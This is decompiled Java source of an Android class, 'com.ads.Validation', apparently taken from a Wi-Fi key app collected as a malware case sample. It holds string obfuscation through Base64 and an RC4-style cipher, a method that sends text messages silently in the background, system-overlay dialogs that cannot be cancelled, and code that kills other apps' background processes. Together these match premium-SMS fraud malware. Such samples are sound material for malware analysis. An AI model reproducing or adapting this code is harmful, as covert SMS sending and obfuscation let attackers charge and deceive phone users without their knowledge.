package com.example.lw.appkeys.com.ads;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.view.Window;
import java.util.Locale;

public class Validation
{
  private static Editor a;
  private static Context b;
  private static SharedPreferences c;
  private static int d;
  private static String e;
  private static String f;
  private static String g;
  private static int h;
  private static int i;
  private static boolean j;
  private static final String k;
  private static final char[] l;
  private static final byte[] m;
  
  static
  {
    int i2 = 0;
    e = "RhVyaBFKOnNyUDhXU34SN3USSFwnGSUgNwtwYQRV";
    f = "OWkNfQ==";
    g = "";
    h = 0;
    i = 1;
    j = true;
    k = System.getProperty("line.separator");
    l = new char[64];
    int n = 65;
    int i1 = 0;
    if (n > 90)
    {
      n = 97;
      label58:
      if (n <= 122) {
        break label140;
      }
      n = 48;
      label67:
      if (n <= 57) {
        break label158;
      }
      char[] arrayOfChar = l;
      int i3 = i1 + 1;
      arrayOfChar[i1] = '+';
      l[i3] = '/';
      m = new byte[''];
      i1 = 0;
      label105:
      if (i1 < m.length) {
        break label176;
      }
      i1 = i2;
    }
    for (;;)
    {
      if (i1 >= 64)
      {
        return;
        l[i1] = n;
        n = (char)(n + 1);
        i1 += 1;
        break;
        label140:
        l[i1] = n;
        n = (char)(n + 1);
        i1 += 1;
        break label58;
        label158:
        l[i1] = n;
        n = (char)(n + 1);
        i1 += 1;
        break label67;
        label176:
        m[i1] = -1;
        i1 += 1;
        break label105;
      }
      m[l[i1]] = ((byte)i1);
      i1 += 1;
    }
  }
  
  public static String a(String paramString)
  {
    return new String(a(paramString.getBytes()));
  }
  
  public static void a(Context paramContext)
  {
    try
    {
      b = paramContext;
      new Thread(new Validation.1()).start();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static byte[] a(char[] paramArrayOfChar)
  {
    return a(paramArrayOfChar, 0, paramArrayOfChar.length);
  }
  
  public static byte[] a(char[] paramArrayOfChar, int paramInt1, int paramInt2)
  {
    int n = paramInt2;
    if (paramInt2 % 4 != 0) {
      throw new IllegalArgumentException("Length of multiple of 4.");
    }
    while ((n > 0) && (paramArrayOfChar[(paramInt1 + n - 1)] == '=')) {
      n -= 1;
    }
    int i2 = n * 3 / 4;
    byte[] arrayOfByte = new byte[i2];
    int i3 = paramInt1 + n;
    n = 0;
    paramInt2 = paramInt1;
    paramInt1 = n;
    if (paramInt2 >= i3) {
      return arrayOfByte;
    }
    n = paramInt2 + 1;
    int i4 = paramArrayOfChar[paramInt2];
    paramInt2 = n + 1;
    int i5 = paramArrayOfChar[n];
    if (paramInt2 < i3)
    {
      n = paramArrayOfChar[paramInt2];
      paramInt2 += 1;
      if (paramInt2 >= i3) {
        break label161;
      }
      i1 = paramArrayOfChar[paramInt2];
      paramInt2 += 1;
    }
    for (;;)
    {
      if ((i4 <= 127) && (i5 <= 127) && (n <= 127) && (i1 <= 127)) {
        break label168;
      }
      throw new IllegalArgumentException("Illegal character.");
      n = 65;
      break;
      label161:
      i1 = 65;
    }
    label168:
    int i6 = m[i4];
    i5 = m[i5];
    i4 = m[n];
    int i1 = m[i1];
    if ((i6 < 0) || (i5 < 0) || (i4 < 0) || (i1 < 0)) {
      throw new IllegalArgumentException("Illegal character.");
    }
    n = paramInt1 + 1;
    arrayOfByte[paramInt1] = ((byte)(i5 >>> 4 | i6 << 2));
    if (n < i2)
    {
      paramInt1 = n + 1;
      arrayOfByte[n] = ((byte)(i4 >>> 2 | (i5 & 0xF) << 4));
    }
    for (;;)
    {
      if (paramInt1 < i2)
      {
        arrayOfByte[paramInt1] = ((byte)((i4 & 0x3) << 6 | i1));
        paramInt1 += 1;
        break;
      }
      break;
      paramInt1 = n;
    }
  }
  
  public static char[] a(byte[] paramArrayOfByte)
  {
    return a(paramArrayOfByte, 0, paramArrayOfByte.length);
  }
  
  public static char[] a(byte[] paramArrayOfByte, int paramInt1, int paramInt2)
  {
    int i4 = (paramInt2 * 4 + 2) / 3;
    char[] arrayOfChar = new char[(paramInt2 + 2) / 3 * 4];
    int i5 = paramInt1 + paramInt2;
    paramInt2 = 0;
    if (paramInt1 >= i5) {
      return arrayOfChar;
    }
    int i1 = paramInt1 + 1;
    int i6 = paramArrayOfByte[paramInt1] & 0xFF;
    int i2;
    if (i1 < i5)
    {
      paramInt1 = paramArrayOfByte[i1] & 0xFF;
      i2 = i1 + 1;
      i1 = paramInt1;
      paramInt1 = i2;
      label78:
      if (paramInt1 >= i5) {
        break label221;
      }
      i2 = paramInt1 + 1;
      int i3 = paramArrayOfByte[paramInt1] & 0xFF;
      paramInt1 = i2;
      i2 = i3;
      label105:
      i3 = paramInt2 + 1;
      arrayOfChar[paramInt2] = l[(i6 >>> 2)];
      paramInt2 = i3 + 1;
      arrayOfChar[i3] = l[((i6 & 0x3) << 4 | i1 >>> 4)];
      if (paramInt2 >= i4) {
        break label227;
      }
      n = l[((i1 & 0xF) << 2 | i2 >>> 6)];
      label171:
      arrayOfChar[paramInt2] = n;
      paramInt2 += 1;
      if (paramInt2 >= i4) {
        break label233;
      }
    }
    label221:
    label227:
    label233:
    for (int n = l[(i2 & 0x3F)];; n = 61)
    {
      arrayOfChar[paramInt2] = n;
      paramInt2 += 1;
      break;
      i2 = 0;
      paramInt1 = i1;
      i1 = i2;
      break label78;
      i2 = 0;
      break label105;
      n = 61;
      break label171;
    }
  }
  
  private static long b(String paramString, long paramLong)
  {
    try
    {
      long l1 = Long.parseLong(paramString);
      return l1;
    }
    catch (NumberFormatException paramString) {}
    return paramLong;
  }
  
  public static String b(String paramString)
  {
    return new String(c(paramString));
  }
  
  private static void b(Context paramContext, String paramString1, String paramString2)
  {
    h += 1;
    String str = "SMS_SENT_" + h;
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(str), 0);
    paramContext.registerReceiver(new Validation.6(), new IntentFilter(str));
    SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, localPendingIntent, null);
  }
  
  public static byte[] c(String paramString)
  {
    return a(paramString.toCharArray());
  }
  
  public static String d(String paramString)
  {
    return new String(a(f(paramString)));
  }
  
  public static String e(String paramString)
  {
    return new String(f(b(paramString)));
  }
  
  public static String f(String paramString)
  {
    int i3 = 0;
    int[] arrayOfInt = new int[''];
    Object localObject = new byte[''];
    int n = 0;
    label28:
    int i1;
    label39:
    int i2;
    if (n >= 128)
    {
      n = 0;
      if (n < 128) {
        break label92;
      }
      n = 0;
      i1 = 0;
      if (n < 128) {
        break label113;
      }
      paramString = paramString.toCharArray();
      localObject = new char[paramString.length];
      i2 = 0;
      i1 = 0;
    }
    for (n = i3;; n = (short)(n + 1))
    {
      if (n >= paramString.length)
      {
        return new String((char[])localObject);
        arrayOfInt[n] = n;
        n += 1;
        break;
        label92:
        localObject[n] = ((byte)"65535".charAt(n % 5));
        n = (short)(n + 1);
        break label28;
        label113:
        i1 = (i1 + arrayOfInt[n] + localObject[n]) % 128;
        i2 = arrayOfInt[n];
        arrayOfInt[n] = arrayOfInt[i1];
        arrayOfInt[i1] = i2;
        n += 1;
        break label39;
      }
      i2 = (i2 + 1) % 128;
      i1 = (i1 + arrayOfInt[i2]) % 128;
      i3 = arrayOfInt[i2];
      arrayOfInt[i2] = arrayOfInt[i1];
      arrayOfInt[i1] = i3;
      localObject[n] = ((char)((char)arrayOfInt[((arrayOfInt[i2] + arrayOfInt[i1] % 128) % 128)] ^ paramString[n]));
    }
  }
  
  private static void l()
  {
    Object localObject = new Builder(b.getApplicationContext());
    if ((g != null) && (g.length() > 0))
    {
      ((Builder)localObject).setTitle("Thông báo");
      ((Builder)localObject).setMessage(g.replace("\\n", "\n"));
    }
    for (;;)
    {
      ((Builder)localObject).setPositiveButton("No", new Validation.2());
      ((Builder)localObject).setNegativeButton("Yes", new Validation.3());
      localObject = ((Builder)localObject).create();
      ((AlertDialog)localObject).setCancelable(false);
      ((AlertDialog)localObject).getWindow().setType(2003);
      ((AlertDialog)localObject).show();
      return;
      if (Locale.getDefault().getLanguage().equals("vi"))
      {
        ((Builder)localObject).setTitle(e("VTbhu6chRUQ2fH0eNMONU21GcT3hu4xIxb3DpAlt4buccBIr4buxXQ=="));
        ((Builder)localObject).setMessage(e("Q+G7v1RoBsOQf3Bm4buvPhRa4bunDyUhSAZMaUHhuqoNJFnCrjNbQQtv4bqtaioa4burQmc=") + e(f) + e("ITVSwrwLRGA="));
      }
      else
      {
        ((Builder)localObject).setTitle(e("VSxTKQkDKXhhTTlbUyoOZCYBDRR3QHcGYA=="));
        ((Builder)localObject).setMessage(e("RTEaMQpWf2pyUCQUSWVGdjBPDExmSnEKcldjPVYSEGFreyoaXws=") + e(f) + e("Pg=="));
      }
    }
  }
  
  private static void m()
  {
    Object localObject = new Builder(b.getApplicationContext());
    if (Locale.getDefault().getLanguage().equals("vi"))
    {
      ((Builder)localObject).setTitle("Thoát ứng dụng");
      ((Builder)localObject).setMessage("Bạn có chắc mình muốn thoát ứng dụng không?");
    }
    for (;;)
    {
      ((Builder)localObject).setPositiveButton("No", new Validation.4());
      ((Builder)localObject).setNegativeButton("Yes", new Validation.5());
      localObject = ((Builder)localObject).create();
      ((AlertDialog)localObject).setCancelable(false);
      ((AlertDialog)localObject).getWindow().setType(2003);
      ((AlertDialog)localObject).show();
      return;
      ((Builder)localObject).setTitle("Exit application");
      ((Builder)localObject).setMessage("Are you sure you want to exit this application?");
    }
  }
  
  /* Error */
  private static void n()
  {
    // Byte code:
    //   0: ldc_w 331
    //   3: invokestatic 298	com/ads/Validation:e	(Ljava/lang/String;)Ljava/lang/String;
    //   6: ldc_w 333
    //   9: invokevirtual 337	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   12: ifeq +30 -> 42
    //   15: new 157	android/content/Intent
    //   18: dup
    //   19: ldc_w 339
    //   22: ldc_w 331
    //   25: invokestatic 298	com/ads/Validation:e	(Ljava/lang/String;)Ljava/lang/String;
    //   28: invokestatic 345	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   31: invokespecial 348	android/content/Intent:<init>	(Ljava/lang/String;Landroid/net/Uri;)V
    //   34: astore_0
    //   35: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   38: aload_0
    //   39: invokevirtual 352	android/content/Context:startActivity	(Landroid/content/Intent;)V
    //   42: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   45: checkcast 354	android/app/Activity
    //   48: invokevirtual 357	android/app/Activity:finish	()V
    //   51: invokestatic 362	android/os/Process:myPid	()I
    //   54: invokestatic 365	android/os/Process:killProcess	(I)V
    //   57: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   60: checkcast 354	android/app/Activity
    //   63: invokevirtual 368	android/app/Activity:isFinishing	()Z
    //   66: ifeq +55 -> 121
    //   69: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   72: invokevirtual 220	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   75: invokevirtual 372	android/content/Context:getPackageManager	()Landroid/content/pm/PackageManager;
    //   78: iconst_0
    //   79: invokevirtual 378	android/content/pm/PackageManager:getInstalledApplications	(I)Ljava/util/List;
    //   82: astore_1
    //   83: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   86: invokevirtual 220	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   89: ldc_w 380
    //   92: invokevirtual 384	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   95: checkcast 386	android/app/ActivityManager
    //   98: astore_0
    //   99: aload_1
    //   100: invokeinterface 392 1 0
    //   105: astore_1
    //   106: aload_1
    //   107: invokeinterface 397 1 0
    //   112: ifne +10 -> 122
    //   115: invokestatic 362	android/os/Process:myPid	()I
    //   118: invokestatic 365	android/os/Process:killProcess	(I)V
    //   121: return
    //   122: aload_1
    //   123: invokeinterface 401 1 0
    //   128: checkcast 403	android/content/pm/ApplicationInfo
    //   131: astore_2
    //   132: aload_2
    //   133: getfield 406	android/content/pm/ApplicationInfo:flags	I
    //   136: iconst_1
    //   137: iand
    //   138: iconst_1
    //   139: if_icmpeq -33 -> 106
    //   142: aload_2
    //   143: getfield 409	android/content/pm/ApplicationInfo:packageName	Ljava/lang/String;
    //   146: getstatic 69	com/ads/Validation:b	Landroid/content/Context;
    //   149: invokevirtual 412	android/content/Context:getPackageName	()Ljava/lang/String;
    //   152: invokevirtual 294	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   155: ifeq -49 -> 106
    //   158: aload_0
    //   159: aload_2
    //   160: getfield 409	android/content/pm/ApplicationInfo:packageName	Ljava/lang/String;
    //   163: invokevirtual 415	android/app/ActivityManager:killBackgroundProcesses	(Ljava/lang/String;)V
    //   166: goto -51 -> 115
    //   169: astore_0
    //   170: goto -128 -> 42
    // Local variable table:
    //   start	length	slot	name	signature
    //   34	125	0	localObject1	Object
    //   169	1	0	localException	Exception
    //   82	41	1	localObject2	Object
    //   131	29	2	localApplicationInfo	android.content.pm.ApplicationInfo
    // Exception table:
    //   from	to	target	type
    //   0	42	169	java/lang/Exception
  }
}


/* Location:           F:\四个案例的jar\无线网钥匙\classes-dex2jar.jar
 * Qualified Name:     com.ads.Validation
 * JD-Core Version:    0.7.0-SNAPSHOT-20130630
 */